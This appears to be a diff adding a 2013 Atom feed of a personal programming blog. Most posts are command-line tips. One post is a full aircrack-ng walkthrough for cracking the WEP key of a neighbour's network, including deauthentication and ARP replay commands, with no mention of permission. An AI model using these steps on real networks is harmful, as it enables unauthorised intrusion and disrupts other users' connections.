@@ -1,0 +1,754 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed>
+
+  <title><![CDATA[tales of code]]></title>
+  <link href="http://blog.slezica.me/atom.xml" rel="self"/>
+  <link href="http://blog.slezica.me/"/>
+  <updated>2013-03-12T07:31:49-03:00</updated>
+  <id>http://blog.slezica.me/</id>
+  <author>
+    <name><![CDATA[Santiago Lezica]]></name>
+    
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[Fixing bash commands]]></title>
+    <link href="http://blog.slezica.me/blog/2013/03/12/fixing-bash-commands/"/>
+    <updated>2013-03-12T06:40:00-03:00</updated>
+    <id>http://blog.slezica.me/blog/2013/03/12/fixing-bash-commands</id>
+    <content type="html"><![CDATA[<p>Bash provides some editor integration to ease writing of long, complex commands.</p>
+
+<ol>
+<li><p><kbd>ctrl</kbd> <kbd>x</kbd> <kbd>ctrl</kbd> <kbd>e</kbd> will bring up an
+editor to write a new command. Upon saving and exiting, it gets executed.</p></li>
+<li><p>Likewise, the <code>fc</code> command opens an editor to edit the previous command.</p></li>
+</ol>
+
+
+<p>I knew about the keybinding, but I learned of <code>fc</code> fairly recently. If you use a
+powerful command-line editor, it&#8217;s game-changing, specially when dealing with
+long pipes and/or regular expressions.</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[GNU units conversion]]></title>
+    <link href="http://blog.slezica.me/blog/2013/02/13/gnu-units-conversion/"/>
+    <updated>2013-02-13T20:12:00-03:00</updated>
+    <id>http://blog.slezica.me/blog/2013/02/13/gnu-units-conversion</id>
+    <content type="html"><![CDATA[<p>I just discovered a wonderful specimen in my <code>/usr/bin</code> bitpond. <code>units</code> performs unit conversion with the added nicety of reporting both the direct and inverse relation between the quantities.</p>
+
+<p>Behold:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>~<span class="nv">$ </span>units <span class="s1">&#39;1 kilometer&#39;</span> meters
+</span><span class='line'>    * 1000
+</span><span class='line'>    / 0.001
+</span><span class='line'>
+</span><span class='line'>~<span class="nv">$ </span>units <span class="s1">&#39;1 day&#39;</span> seconds
+</span><span class='line'>    * 86400
+</span><span class='line'>    / 1.1574074e-05
+</span><span class='line'>
+</span><span class='line'>~<span class="nv">$ </span>units <span class="s1">&#39;10 ohms&#39;</span>
+</span><span class='line'>    Definition: 10 kg m^2 / A^2 s^3
+</span><span class='line'>
+</span><span class='line'>~<span class="nv">$ </span>units <span class="s1">&#39;10 newton&#39;</span> kg
+</span><span class='line'>conformability error
+</span><span class='line'>    10 kg m / s^2
+</span><span class='line'>    1 kg
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Smart beast!</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Figuring out compilation flags]]></title>
+    <link href="http://blog.slezica.me/blog/2013/02/12/figuring-out-compilation-flags/"/>
+    <updated>2013-02-12T14:24:00-03:00</updated>
+    <id>http://blog.slezica.me/blog/2013/02/12/figuring-out-compilation-flags</id>
+    <content type="html"><![CDATA[<p>I&#8217;ve spent endless time over the years digging up correct compilation flags from manuals and google results. I decided to learn, once and for all, how to obtain them from my system.</p>
+
+<p>Turns out, the <code>pkg-config</code> utility can be made to print <code>--cflags</code> and/or <code>--libs</code> (link flags) painlessly:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>~<span class="nv">$ </span>pkg-config --cflags --libs sdl
+</span><span class='line'>-D_GNU_SOURCE<span class="o">=</span>1 -D_REENTRANT -I/usr/include/SDL  -lSDL
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Moreover, to list all available options (if autocompletion is not available, you probably can get this far by pressing tab), just locate the <code>.pc</code> files <code>pkg-config</code> uses.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>~<span class="nv">$ </span>locate --regex pkgconfig/.*pc<span class="err">$</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The <code>PKG_CONFIG_PATH</code> environment variable can also be examined if needed.</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[WEP passwords with aircrack-ng]]></title>
+    <link href="http://blog.slezica.me/blog/2013/02/09/getting-wi-fi-passwords-with-aircrack-ng/"/>
+    <updated>2013-02-09T04:35:00-03:00</updated>
+    <id>http://blog.slezica.me/blog/2013/02/09/getting-wi-fi-passwords-with-aircrack-ng</id>
+    <content type="html"><![CDATA[<p>So I was bored, and decided to learn the basics of using <code>aircrack-ng</code>, the wi-fi password cracker. Now I&#8217;m bored again, so I&#8217;m writing about it.</p>
+
+<h2>Preface</h2>
+
+<p>What we&#8217;ll do is capture freely flowing information from a network we can&#8217;t connect to, and crunch that data with the <code>aircrack</code> tool in the hopes of deducing the password.</p>
+
+<p>Your interface&#8217;s names may vary. Use <code>iwconfig</code>. For other names and values, I&#8217;ll give examples for you to tailor.</p>
+
+<h2>Step 0: install the toolset</h2>
+
+<p>In Debian:</p>
+
+<pre><code>~# apt-get install aircrack-ng
+</code></pre>
+
+<h2>Step 1: monitoring</h2>
+
+<p>Before we can start sniffing the air for packets, we need to put the network interface in monitor mode. Otherwise, it will restrict itself to packets addressed to us. We want to be all ears.</p>
+
+<p>Before you do this, disconnect <code>wlan0</code>. Ready? Now:</p>
+
+<pre><code>~# airmon-ng start wlan0
+</code></pre>
+
+<p>You should see something like this:</p>
+
+<pre><code>Interface   Chipset     Driver
+
+wlan0       Unknown     brcmsmac - [phy0]
+                (monitor mode enabled on mon0)
+</code></pre>
+
+<h2>Step 2: selecting a target</h2>
+
+<p>We want to catch a glimpse of what&#8217;s going on with all reachable networks. Run:</p>
+
+<pre><code>~# airodump-ng mon0
+</code></pre>
+
+<p>The output may be confusing at first glance. Let&#8217;s go over the important bits:</p>
+
+<p>The top line shows the current channel being listened to (<code>CH n</code>), and it should be hopping from channel to channel.</p>
+
+<p>The table below lists discovered access points. You&#8217;ll probably recognize the names. You&#8217;re looking for a network with:</p>
+
+<ol>
+<li><p><code>WEP</code> encryption (WPA is basically brute force, and thus boring to wait for).</p></li>
+<li><p>An increasing number of <code>Data</code> packets, meaning that a client is connected and active. These are the packets we&#8217;ll be sniffing.</p></li>
+</ol>
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
+</span><span class='line'>92:FC:11:E1:FF:2F  -74      140      120    0   9  54e. WEP  WEP         Neighbor</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The bottom table shows clients. If there&#8217;s <code>#Data</code> flowing around, that probably means you&#8217;ll see somebody here.</p>
+
+<p>Once you&#8217;ve picked your target, save away:</p>
+
+<ol>
+<li><p><code>BSSID</code> (MAC address), <code>CH</code> (wi-fi channel) and <code>ESSID</code> (name) from the top table.</p></li>
+<li><p><code>STATION</code> (MAC address) of an active client in the second table.</p></li>
+</ol>
+
+
+<p>The second bit is not necessary, but it will speed things up <strong>considerably</strong>.</p>
+
+<h2>Step 3: capture packets</h2>
+
+<p>Let&#8217;s run <code>airodump</code> again, but this time restricting ourselves to our target network and dumping everything down:</p>
+
+<pre><code>~# airodump-ng mon0 --channel 6 --bssid 00:1A:70:85:9D:11 -w logfile
+</code></pre>
+
+<p>Again you&#8217;ll see it capturing packets, but this time it should only list this particular network and its clients.</p>
+
+<p>You&#8217;ll want to let it capture between <code>40.000</code> and <code>80.000</code> data packets. You may need more, you may need less. This is not guaranteed to work on every try.</p>
+
+<p>Leave this running.</p>
+
+<h2>Step 3.5: speed up the capture</h2>
+
+<p>This may be a slow process on low network activity, but we may be able to speed it up quite a bit by injecting packets.</p>
+
+<p>Basically, since WEP packets are replayable (you can bounce them back and forth and they will remain valid), we may be able to catch an <a href="http://en.wikipedia.org/wiki/Address_Resolution_Protocol">ARP</a> packet and replay it endlessly to generate traffic we can analyze.</p>
+
+<p>First, you may want to try if injection works on every end (your drivers too must be compliant here) by faking an authentication with the access point:</p>
+
+<pre><code>~# aireplay-ng wlan0 --fakeauth 0 -e "Neighbor" -b 92:FC:11:E1:FF:2F
+</code></pre>
+
+<p>Fortunately, you&#8217;ll see this:</p>
+
+<pre><code>Sending Authentication Request
+Authentication successful
+Sending Association Request
+Association successful :-)
+</code></pre>
+
+<p>This will not generate an ARP packet we can catch, we still need a real client to use as source. So, if it&#8217;s working, grab the MAC address of the client you got earlier (<code>STATION</code> in the lower table?) and run:</p>
+
+<pre><code>aireplay-ng --arpreplay -b 92:FC:11:E1:FF:2F -s &lt;client MAC&gt; wlan0
+</code></pre>
+
+<p>You now need to wait for an ARP packet to show up. When it does, you&#8217;ll immediately notice a <strong>massive</strong> increase in the rate of packets captured by <code>airodump</code>.</p>
+
+<p>If the wait turns out to be long (this depends on your patience), we have one more shot: injecting a deauthentication for the client, forcing him to emmit an ARP packet <code>aireplay</code> can sniff.</p>
+
+<pre><code>aireplay-ng --deauth 5 -b 92:FC:11:E1:FF:2F -d &lt;client MAC&gt; wlan0
+</code></pre>
+
+<p>That&#8217;ll do it 5 times by itself, and you can re-run if it doesn&#8217;t work right away. Again, this is not guaranteed to succeed.</p>
+
+<h2>Step 4: crack the password</h2>
+
+<p>When you decide to stop <code>airodump</code>, you&#8217;ll see <code>logfile-01.cap</code> (or an incrementally numbered variant) among the files produced. Run <code>aircrack</code>:</p>
+
+<pre><code>aircrack-ng --bssid 92:FC:11:E1:FF:2F logfile-01.cap
+</code></pre>
+
+<p>With any luck, you&#8217;ll have your password. Cheers!</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Empower your command-line]]></title>
+    <link href="http://blog.slezica.me/blog/2013/02/03/empower-your-command-line/"/>
+    <updated>2013-02-03T20:42:00-03:00</updated>
+    <id>http://blog.slezica.me/blog/2013/02/03/empower-your-command-line</id>
+    <content type="html"><![CDATA[<p>Most developers spend a lot of time in the command-line. Nothing to wonder about: it&#8217;s a <a href="http://blog.slezica.me/2012/06/29/stop-trying-to-get-rid-of-the-keyboard">powerful tool</a>. Oh, but it can get even better.</p>
+
+<p>We&#8217;ll start with simple <code>bash</code> and <code>.profile</code> tricks, and move on to crazier stuff.</p>
+
+<h2>Don&#8217;t repeat yourself</h2>
+
+<p>Everyone knows to search history with <code>&lt;Ctrl&gt;+R</code>. Two other, little known <code>bash</code> features are also amazing time-savers:</p>
+
+<ol>
+<li><p>The <code>!!</code> sequence grabs the last command you entered. You&#8217;ll love it when you forget to prepend <code>sudo</code> to a long line: <code>~$ sudo !!</code>.</p></li>
+<li><p>The <code>&lt;Alt&gt;+.</code> combination brings back in the latest entered tokens. Fantastic for repeating file names and URLs.</p></li>
+<li><p><a href="http://www.gnu.org/software/bash/manual/html_node/Brace-Expansion.html">Brace expansion</a> allows you to write similar names with minimal hassle. Let me show you the tip of the iceberg:</p></li>
+</ol>
+
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='objc'><span class='line'><span class="o">~</span><span class="n">$</span> <span class="n">echo</span> <span class="n">dir</span><span class="o">/</span><span class="p">{</span><span class="n">foo</span><span class="p">,</span><span class="n">bar</span><span class="p">,</span><span class="n">baz</span><span class="p">}.</span><span class="n">zip</span>
+</span><span class='line'><span class="n">dir</span><span class="o">/</span><span class="n">foo</span><span class="p">.</span><span class="n">zip</span> <span class="n">dir</span><span class="o">/</span><span class="n">bar</span><span class="p">.</span><span class="n">zip</span> <span class="n">dir</span><span class="o">/</span><span class="n">baz</span><span class="p">.</span><span class="n">zip</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>There&#8217;s a whole world of functionality aimed at reusing entries from your <a href="http://www.gnu.org/software/bash/manual/html_node/Event-Designators.html#Event-Designators">history</a> and <a href="http://www.gnu.org/software/bash/manual/html_node/Shell-Expansions.html#Shell-Expansions">expanding tokens</a>.</p>
+
+<h2>Move around fast</h2>
+
+<p>First, let&#8217;s remove the pain of typing <code>cd ../../..</code>:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='objc'><span class='line'><span class="n">alias</span> <span class="p">..</span><span class="o">=</span><span class="s">&quot;cd ..&quot;</span>
+</span><span class='line'><span class="n">alias</span> <span class="p">...</span><span class="o">=</span><span class="s">&quot;cd ../..&quot;</span>
+</span><span class='line'><span class="n">alias</span> <span class="p">....</span><span class="o">=</span><span class="s">&quot;cd ../../..&quot;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Combine that with the fact that <code>cd -</code> brings you back to the previous directory you were in, and now you can quickly jump to your project&#8217;s root and back to the subdirectory you were working in.</p>
+
+<h2>Keep your context at hand</h2>
+
+<p>If you need to perform a one-off task unrelated to your current workflow, don&#8217;t <code>cd</code> away and drop garbage in your <code>history</code>. Instead, invoke a subshell running <code>bash</code>, do what you must, and <code>&lt;Ctrl&gt;+D</code> back to where you were.</p>
+
+<h2>Never wait on grep again</h2>
+
+<p>The <a href="https://github.com/ggreer/the_silver_searcher">Silver Searcher</a>, command-named <code>ag</code>, is a blazing fast drop-in replacement for <code>grep</code>/<code>awk</code>. <strong>Several</strong> times as fast.</p>
+
+<p>The author details some of the optimizations he made:</p>
+
+<p><small></p>
+
+<blockquote><ol>
+<li>Searching for literals (no regex) uses Boyer-Moore-Horspool strstr.</li>
+<li>Files are mmap()ed instead of read into a buffer.</li>
+<li>If you&#8217;re building with PCRE 8.21 or greater, regex searches use the JIT compiler.</li>
+<li>Ag calls pcre_study() before executing the regex on a jillion files.</li>
+<li>Instead of calling fnmatch() on every pattern in your ignore files, non-regex patterns are loaded into an array and binary searched.</li>
+<li>Ag uses Pthreads to take advantage of multiple CPU cores and search files in parallel.</li>
+</ol>
+</blockquote>
+
+<p></small></p>
+
+<p>Clone the repo, <code>make install</code>, and you&#8217;re good to go.</p>
+
+<h2>Interact with the clipboard</h2>
+
+<p>Copying and pasting to and from the system clipboard can get messy. You&#8217;ll know what I mean if you ever had to wait on a <strong>long</strong> stream of <code>command not found</code> events after mistakenly pasting text with newlines, all the time wondering if any line was a valid command.</p>
+
+<p>Install <code>xclip</code>, and define two simple aliases:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='objc'><span class='line'><span class="n">alias</span> <span class="n">xc</span><span class="o">=</span><span class="s">&quot;xclip -selection clipboard&quot;</span>
+</span><span class='line'><span class="n">alias</span> <span class="n">xp</span><span class="o">=</span><span class="s">&quot;xclip -selection clipboard -o&quot;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Now you can copy text from your browser, and bring it into your command-line painlessly, as well copy files or program outputs:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='objc'><span class='line'><span class="o">~</span><span class="n">$</span> <span class="n">cat</span> <span class="n">foo</span> <span class="o">|</span> <span class="n">awk</span> <span class="err">&#39;</span><span class="p">{</span><span class="n">print</span> <span class="n">$2</span><span class="p">}</span><span class="err">&#39;</span> <span class="o">|</span> <span class="n">xc</span>  <span class="err">#</span> <span class="n">Copy</span><span class="o">!</span>
+</span><span class='line'><span class="o">~</span><span class="n">$</span> <span class="n">xp</span> <span class="o">|</span> <span class="n">grep</span> <span class="err">&#39;</span><span class="n">foo</span><span class="err">&#39;</span> <span class="o">&gt;</span> <span class="n">bar</span>            <span class="err">#</span> <span class="n">Paste</span><span class="o">!</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>Open files with the right tool</h2>
+
+<p>The <code>gnome-open</code> program (which has equivalents in every desktop environment I know of) will open a file just as it would from a graphical file manager. You can <code>alias</code> it to <code>open</code>, and pull off neat tricks like <code>open .</code> to quickly bring up your current working directory in a GUI.</p>
+
+<h2>Show the current branch in your prompt</h2>
+
+<p>If you&#8217;re into branching, merging and rebasing your git repositories, you&#8217;ll find yourself typing <code>git branch</code> way too often. Why not just show it right there in your prompt?</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='objc'><span class='line'><span class="o">~/</span><span class="n">projects</span><span class="o">/</span><span class="n">foo</span> <span class="p">(</span><span class="n">master</span><span class="p">)</span><span class="n">$</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The following function grabs the git branch <em>if there is one</em>, and echoes its name with a preceeding space. This way, you won&#8217;t even notice this in your profile until you <code>cd</code> into a <code>git</code> repo.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='objc'><span class='line'><span class="n">function</span> <span class="n">echo_git_branch</span> <span class="p">{</span>
+</span><span class='line'>    <span class="n">git</span> <span class="n">status</span> <span class="mi">2</span><span class="o">&gt;</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span> <span class="o">|</span> <span class="n">head</span> <span class="o">-</span><span class="n">n</span> <span class="mi">1</span> <span class="o">|</span> <span class="n">grep</span> <span class="o">-</span><span class="n">o</span> <span class="err">&#39;</span><span class="p">[</span><span class="o">^</span> <span class="p">]</span><span class="err">\</span><span class="o">+</span><span class="n">$</span><span class="err">&#39;</span> <span class="o">|</span> <span class="n">sed</span> <span class="s">&quot;s/\(.*\)/ (</span><span class="se">\1</span><span class="s">)/&quot;</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>You can put this in your prompt by exporting <code>$PS1</code>. Let&#8217;s add some color into the mix while we&#8217;re at it, so that it never goes unnoticed:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+</pre></td><td class='code'><pre><code class='objc'><span class='line'><span class="n">function</span> <span class="n">set_prompt</span> <span class="p">{</span>
+</span><span class='line'>    <span class="n">local</span> <span class="n">RESET</span><span class="o">=</span><span class="s">&quot;\[</span><span class="se">\033</span><span class="s">[00m\]&quot;</span>
+</span><span class='line'>    <span class="n">local</span> <span class="n">BLUE</span><span class="o">=</span><span class="s">&quot;\[</span><span class="se">\033</span><span class="s">[1;34m\]&quot;</span>
+</span><span class='line'>    <span class="n">local</span> <span class="n">RED</span><span class="o">=</span><span class="s">&quot;\[</span><span class="se">\033</span><span class="s">[1;31m\]&quot;</span>
+</span><span class='line'>    <span class="n">local</span> <span class="n">GREEN</span><span class="o">=</span><span class="s">&quot;\[</span><span class="se">\033</span><span class="s">[1;32m\]&quot;</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="n">local</span> <span class="n">USER</span><span class="o">=</span><span class="s">&quot;${debian_chroot:+($debian_chroot)}${GREEN}\u@\h${RESET}&quot;</span>
+</span><span class='line'>    <span class="n">local</span> <span class="n">DIR</span><span class="o">=</span><span class="s">&quot;${BLUE}\w${RESET}&quot;</span>
+</span><span class='line'>    <span class="n">local</span> <span class="n">SYMB</span><span class="o">=</span><span class="s">&quot;\$ &quot;</span>
+</span><span class='line'>    <span class="n">local</span> <span class="n">BRANCH</span><span class="o">=</span><span class="s">&quot;${RED}\$(echo_git_branch)${RESET}&quot;</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="n">export</span> <span class="n">PS1</span><span class="o">=</span><span class="s">&quot;${USER}:${DIR}${BRANCH}${SYMB}&quot;</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">set_prompt</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Customize at will!</p>
+
+<h2>Handle archives uniformly</h2>
+
+<p>A recent <a href="http://xkcd.com/1168/">xkcd post</a> may strike you as both funny and sad. For whatever reason, <code>tar</code>, <code>7z</code>, <code>zip</code>, <code>rar</code> and their bunch all take different flags and arguments, uplifting quick archive managing into a form of art.</p>
+
+<p>That is, unless you have <code>atool</code> installed. Three simple commands with a uniform interface across all different archive types: <code>apack</code>, <code>aunpack</code>, <code>als</code>. I don&#8217;t need to tell you what each of those does.</p>
+
+<p>The program is available in pretty much every package repository out there. Go get it and save yourself (and <code>man</code>) some headaches!</p>
+
+<h2>Generate passwords, IDs and crypto keys</h2>
+
+<p>You could just smash the keyboard and produce a perfectly good alphanumeric combination, but who does that? Instead, generate a random, secure and legible sequence using <code>base64</code>:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='objc'><span class='line'><span class="n">head</span> <span class="o">-</span><span class="n">c</span> <span class="mi">24</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">urandom</span> <span class="o">|</span> <span class="n">base64</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The <code>head</code> part just limits the number of bytes read. You can <code>cat</code> instead if you want to see an infinitely scrolling output of sheer cryptographic goodness.</p>
+
+<h2>Serve the current working directory</h2>
+
+<p>Writing static html? Want to instantly share a file to a friend on the same network? Python&#8217;s got your back:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='objc'><span class='line'><span class="n">alias</span> <span class="n">serve</span><span class="o">=</span><span class="s">&quot;python -m SimpleHTTPServer&quot;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Now, you can just <code>serve</code> from your shell. 5 characters.</p>
+
+<h2>Open up a port to the world</h2>
+
+<p>After running the previous trick, you might want your server to reach beyond the walls of the router. Pick up <a href="http://progrium.com/localtunnel/">localtunnel</a>, a tool that makes tunneling a one-command affair.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class='objc'><span class='line'><span class="o">~</span><span class="n">$</span> <span class="n">serve</span> <span class="o">&amp;</span>
+</span><span class='line'><span class="n">Serving</span> <span class="n">HTTP</span> <span class="n">on</span> <span class="mf">0.0.0.0</span> <span class="n">port</span> <span class="mi">8000</span> <span class="p">...</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">~</span><span class="n">$</span> <span class="n">localtunnel</span> <span class="mi">8000</span>
+</span><span class='line'><span class="n">Port</span> <span class="mi">8000</span> <span class="n">is</span> <span class="n">now</span> <span class="n">publicly</span> <span class="n">accessible</span> <span class="n">from</span> <span class="nl">http:</span><span class="c1">//foo1.localtunnel.com ...</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>If someone was watching, you can now take off your hat and accept tips.</p>
+
+<h2>Monitor files and directories</h2>
+
+<p>The <code>inotifywait</code> tool blocks on file events. It&#8217;s great to pull off a simple monitor-rebuild cycle. For example:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='objc'><span class='line'><span class="o">~</span><span class="n">$</span> <span class="k">while</span> <span class="n">true</span><span class="p">;</span> <span class="k">do</span> <span class="n">inotifywait</span> <span class="n">foo</span><span class="o">/</span> <span class="o">-</span><span class="n">re</span> <span class="n">modify</span><span class="p">;</span> <span class="n">make</span><span class="p">;</span> <span class="n">done</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The <code>man</code> page contains all the details you need for extending the techinique.</p>
+
+<p>Note that <code>inotifywait</code> will set watches in a potentially slow manner. For more complex monitoring, you might consider specialized tools like <a href="https://github.com/mynyml/watchr">watchr</a>.</p>
+
+<h2>Talk to web APIs</h2>
+
+<p>The <code>curl</code> command can perform most of the tasks you face when testing an API you just ran across. Let me give you some basic examples:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+</pre></td><td class='code'><pre><code class='objc'><span class='line'><span class="cp"># Issue a GET request, stdout the response:</span>
+</span><span class='line'><span class="o">~</span><span class="n">$</span> <span class="n">curl</span> <span class="n">some</span><span class="p">.</span><span class="n">api</span><span class="o">/</span><span class="n">things</span>
+</span><span class='line'>
+</span><span class='line'><span class="cp"># POST a string:</span>
+</span><span class='line'><span class="o">~</span><span class="n">$</span> <span class="n">curl</span> <span class="n">some</span><span class="p">.</span><span class="n">api</span><span class="o">/</span><span class="n">things</span> <span class="o">-</span><span class="n">d</span> <span class="err">&#39;</span><span class="n">raw</span> <span class="n">post</span> <span class="n">data</span><span class="err">&#39;</span>
+</span><span class='line'>
+</span><span class='line'><span class="cp"># PUT a file:</span>
+</span><span class='line'><span class="o">~</span><span class="n">$</span> <span class="n">curl</span> <span class="o">-</span><span class="n">X</span> <span class="n">PUT</span> <span class="n">some</span><span class="p">.</span><span class="n">api</span><span class="o">/</span><span class="n">things</span> <span class="o">-</span><span class="n">d</span> <span class="err">@</span><span class="n">file</span>
+</span><span class='line'>
+</span><span class='line'><span class="cp"># POST from stdin:</span>
+</span><span class='line'><span class="o">~</span><span class="n">$</span> <span class="n">foo</span> <span class="o">|</span> <span class="n">curl</span> <span class="n">some</span><span class="p">.</span><span class="n">api</span><span class="o">/</span><span class="n">things</span> <span class="o">-</span><span class="n">d</span> <span class="err">@</span><span class="o">-</span>
+</span><span class='line'>
+</span><span class='line'><span class="cp"># POST form-encoded parameters:</span>
+</span><span class='line'><span class="o">~</span><span class="n">$</span> <span class="n">curl</span> <span class="n">some</span><span class="p">.</span><span class="n">api</span><span class="o">/</span><span class="n">things</span> <span class="o">-</span><span class="n">d</span> <span class="n">foo</span><span class="o">=</span><span class="n">one</span> <span class="o">-</span><span class="n">d</span> <span class="n">bar</span><span class="o">=</span><span class="n">two</span> <span class="o">-</span><span class="n">d</span> <span class="n">baz</span><span class="o">=</span><span class="n">three</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Forget API consoles. The full power of your command-line workflow is available by using <code>curl</code>.</p>
+
+<h2>Pretty-print API responses</h2>
+
+<p>With the recent explosion of JSON-based web-apis, you might frequently find yourself struggling to read minified responses to a <code>curl</code> command. Once again, Python&#8217;s got you covered:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='objc'><span class='line'><span class="n">alias</span> <span class="n">jsont</span><span class="o">=</span><span class="s">&quot;python -m json.tool&quot;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Pipe json into <code>jsont</code>, and rejoice on the readability of well-indented object notation.</p>
+
+<h2>Clean off background tasks</h2>
+
+<p>If you ran <code>inotifywait</code>, <code>serve</code> and <code>localtunnel</code> with <code>&amp;</code>; you now have more jobs in the background than you want to manually terminate. No problem:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='objc'><span class='line'><span class="o">~</span><span class="n">$</span> <span class="n">kill</span> <span class="err">`</span><span class="n">jobs</span> <span class="o">-</span><span class="n">p</span><span class="err">`</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
